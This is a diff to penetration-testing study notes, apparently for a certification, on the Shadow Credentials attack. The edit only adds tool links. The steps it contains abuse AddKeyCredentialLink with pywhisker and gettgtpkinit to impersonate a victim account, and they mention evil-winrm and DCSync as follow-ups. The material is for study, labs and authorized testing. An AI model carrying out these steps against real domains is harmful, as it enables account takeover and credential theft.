@@ -22,7 +22,7 @@ BloodHound shows you hold `AddKeyCredentialLink` (or generic write) over a user 
 
 ## Key flags
 
-- `pywhisker -d DOMAIN -u you -p 'pass' --target VICTIM --action add` — write a key credential and export a PFX.
+- [pywhisker](/cpts/#tool-pywhisker) `-d DOMAIN -u you -p 'pass' --target VICTIM --action add` — write a key credential and export a PFX.
 - `--action list` / `--action remove` / `--action clear` — enumerate or clean up entries (put the attribute back as you found it).
 - `--filename` / the printed PFX password — needed next by `gettgtpkinit`.
 - Authenticate with `-H hash`, `-k`, or a certificate instead of `-p` where you only hold those.
@@ -47,7 +47,7 @@ evil-winrm -i dc01.DOMAIN -r DOMAIN
 
 1. Confirm the write right (BloodHound's `AddKeyCredentialLink`, or any generic write on the target).
 2. Run `pywhisker --action add`; note the PFX path and its password.
-3. Turn the PFX into a TGT with `gettgtpkinit` — see [Pass the Certificate](/cpts/#tool-pass-the-certificate).
+3. Turn the PFX into a TGT with `gettgtpkinit` ([PKINITtools](/cpts/#tool-pkinittools)) — see [Pass the Certificate](/cpts/#tool-pass-the-certificate).
 4. `export KRB5CCNAME` and act as the victim (shell, DCSync, onward enumeration).
 5. **Clean up**: `pywhisker --action remove` (or `clear`) to restore `msDS-KeyCredentialLink`.
 
